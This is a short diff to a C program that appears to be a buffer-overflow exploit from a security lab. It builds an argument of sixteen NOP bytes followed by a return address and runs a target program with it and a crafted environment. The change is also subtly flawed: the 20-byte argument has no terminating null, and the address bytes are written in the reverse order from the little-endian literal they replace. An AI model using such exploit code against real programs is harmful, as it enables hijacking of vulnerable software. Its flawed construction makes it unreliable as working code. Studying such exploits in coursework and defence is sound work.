@@ -24,11 +24,19 @@ int main(void) {
     char *args[3];
     char *envp[1];
     char env[ENV_SIZE];
+    char arg1[20];
 
     environ(env);
 
+    // Create arg1 string using loops and appends
+    memset(arg1, 0x90, 16);
+    arg1[16] = (BASE_ADDR >> 24) & 0xFF;
+    arg1[17] = (BASE_ADDR >> 16) & 0xFF;
+    arg1[18] = (BASE_ADDR >> 8) & 0xFF;
+    arg1[19] = BASE_ADDR & 0xFF;
+
     args[0] = TARGET;
-    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+    args[1] = arg1;
     args[2] = NULL;
 
     envp[0] = env;
